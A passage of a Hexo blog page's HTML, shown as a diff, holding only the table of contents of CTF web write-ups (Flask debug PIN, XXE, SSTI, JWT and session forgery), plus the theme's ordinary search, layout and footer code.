href="#1-%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3-%E4%BB%85pin%E9%A2%98%E5%86%85%E5%AD%98%E5%9C%A8"><span class="toc-text">1. 非预期解 (仅pin题内存在)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E9%A2%84%E6%9C%9F%E8%A7%A3-pin-pin-revenge%E9%80%9A%E7%94%A8"><span class="toc-text">2. 预期解 (pin&amp;pin_revenge通用)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-PIN%E7%94%9F%E6%88%90%E8%A6%81%E7%B4%A0"><span class="toc-text">2.1 PIN生成要素</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-1-username"><span class="toc-text">2.1.1 username</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-2-modname"><span class="toc-text">2.1.2 modname</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-3-appname"><span class="toc-text">2.1.3 appname</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-4-moddir"><span class="toc-text">2.1.4 moddir</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-5-uuidnode"><span class="toc-text">2.1.5 uuidnode</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-6-machine-id"><span class="toc-text">2.1.6 machine_id</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-Python-3-8-MD5-Pin%E8%AE%A1%E7%AE%97%E4%BB%A3%E7%A0%81"><span class="toc-text">2.2 Python &lt; 3.8 MD5 Pin计算代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-Python-3-8-sha1-Pin%E8%AE%A1%E7%AE%97%E4%BB%A3%E7%A0%81"><span class="toc-text">2.3 Python &gt;&#x3D; 3.8 sha1 Pin计算代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-%E5%88%A9%E7%94%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E8%8E%B7%E5%8F%96%E4%BF%A1%E6%81%AF"><span class="toc-text">2.4 利用任意文件读取获取信息</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-1-%E8%AF%BB%E5%8F%96-username"><span class="toc-text">2.4.1 读取 username</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-2-%E8%AF%BB%E5%8F%96-moddir"><span class="toc-text">2.4.2 读取 moddir</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-3-%E8%AF%BB%E5%8F%96-uuidnode"><span class="toc-text">2.4.3 读取 uuidnode</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-4-%E8%AF%BB%E5%8F%96-machine-id"><span class="toc-text">2.4.4 读取 machine_id</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-5-%E8%8E%B7%E5%8F%96-debug-shell"><span class="toc-text">2.5 获取 debug shell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ez-xxe"><span class="toc-text">ez_xxe</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sharpshop"><span class="toc-text">sharpshop</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%8F%8D%E7%BC%96%E8%AF%91ELF-app"><span class="toc-text">1. 反编译ELF-app</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E7%AB%9E%E6%80%81%E6%9D%A1%E4%BB%B6%E5%88%A9%E7%94%A8"><span class="toc-text">2. 竞态条件利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88"><span class="toc-text">3. 解决方案</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%80%81%E5%88%86%E4%BD%A0%E8%A6%81%E4%B8%8D%E8%A6%81"><span class="toc-text">送分你要不要&gt;_&lt;</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E4%B8%8D%E5%8F%AF%E8%A7%81%E5%AD%97%E7%AC%A6%E8%AF%86%E5%88%AB"><span class="toc-text">1. 不可见字符识别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-eval-%E5%88%A9%E7%94%A8"><span class="toc-text">2. eval 利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-Payload-%E6%9E%84%E9%80%A0"><span class="toc-text">3. Payload 构造</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-Python-requests-POST"><span class="toc-text">3.1 Python requests POST</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easy-ssti"><span class="toc-text">easy_ssti</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%A0%E5%96%9C%E6%AC%A2%E9%B8%A3%E6%BF%91%E7%99%BD%E7%BE%BD%E5%90%97"><span class="toc-text">你喜欢鸣濑白羽吗</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E"><span class="toc-text">1. 任意文件读取漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-JWT-Json-Web-Tokens"><span class="toc-text">2. JWT (Json Web Tokens)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-JWT-%E7%9A%84%E7%BB%84%E6%88%90"><span class="toc-text">2.1 JWT 的组成</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-1-Header"><span class="toc-text">2.1.1 Header</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-2-Payload"><span class="toc-text">2.1.2 Payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-3-Signature"><span class="toc-text">2.1.3 Signature</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-4-Base64URL"><span class="toc-text">2.1.4 Base64URL</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-JWT%E7%9A%84%E4%BC%AA%E9%80%A0"><span class="toc-text">2.2 JWT的伪造</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-Payload"><span class="toc-text">3. Payload</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%A0%E7%9C%9F%E7%9A%84%E5%96%9C%E6%AC%A2%E9%B8%A3%E6%BF%91%E7%99%BD%E7%BE%BD%E5%90%97"><span class="toc-text">你真的喜欢鸣濑白羽吗</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-1"><span class="toc-text">1. 任意文件读取漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Python-Flask-Session"><span class="toc-text">2. Python Flask Session</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-Session-%E7%9A%84%E7%BB%84%E6%88%90"><span class="toc-text">2.1 Session 的组成</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-1-Session-Data"><span class="toc-text">2.1.1 Session Data</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-2-Timestamp"><span class="toc-text">2.1.2 Timestamp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-3-Cryptograhpic-Hash"><span class="toc-text">2.1.3 Cryptograhpic Hash</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-4-Base64URL-1"><span class="toc-text">2.1.4 Base64URL</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-Session-%E7%9A%84%E4%BC%AA%E9%80%A0"><span class="toc-text">2.2 Session 的伪造</span></a></li></ol></li></ol></li></ol>
+        
+      </div>
+    </div>
+  </div>
+
+  
+<script src="../../js/catalog.js"></script>
+
+
+
+
+    
+  </div>
+  <script>
+    (() => {
+      function compensate() {
+        const bodyBox = document.querySelector('.zoom-wrap');
+        if (bodyBox) {
+          const gapY = bodyBox.offsetHeight - bodyBox.getBoundingClientRect().height;
+          bodyBox.style.marginBottom = `-${gapY}px`;
+        }
+
+        const catBox = document.querySelector('.catalog-zoom');
+        if (catBox) {
+          const rect = catBox.getBoundingClientRect();
+          const gapX = catBox.offsetWidth  - rect.width;
+          const gapY = catBox.offsetHeight - rect.height;
+
+          const list = catBox.querySelector('.catalog-content');
+          if (list) {
+            const orig = list.dataset.origHeight
+                      ? parseFloat(list.dataset.origHeight)
+                      : parseFloat(getComputedStyle(list).height);
+            list.dataset.origHeight = orig;
+            list.style.height       = (orig + gapY) + 'px';
+          }
+
+          catBox.style.marginRight  = `-${gapX}px`;
+          catBox.style.marginBottom = `-${gapY}px`;
+        }
+      }
+
+      function hookImages(root = document) {
+        root.querySelectorAll('img').forEach(img => {
+          if (img.dataset._scaledFix) return;
+          img.dataset._scaledFix = 1;
+          img.addEventListener('load', compensate, {once: true});
+        });
+      }
+
+      addEventListener('DOMContentLoaded', () => {
+        compensate();
+        hookImages();
+      });
+
+      addEventListener('resize', compensate);
+
+      const observer = new MutationObserver(muts => {
+        muts.forEach(m => {
+          m.addedNodes.forEach(n => {
+            if (n.nodeType !== 1) return;
+            if (n.tagName === 'IMG') hookImages(n.parentNode);
+            else hookImages(n);
+          });
+        });
+      });
+
+      const wrap = document.querySelector('.zoom-wrap');
+      if (wrap) observer.observe(wrap, {childList: true, subtree: true});
+    })();
+  </script>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" href="https://github.com/security-s3ven">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a href="https://github.com/security-s3ven">Copyright © 2023-2026 s3ven</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="../../js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="../../js/colorscheme.js"></script>
+
+
+
+
+
+        
+
+      </div>
+    </div>
+  </body>
+</html>
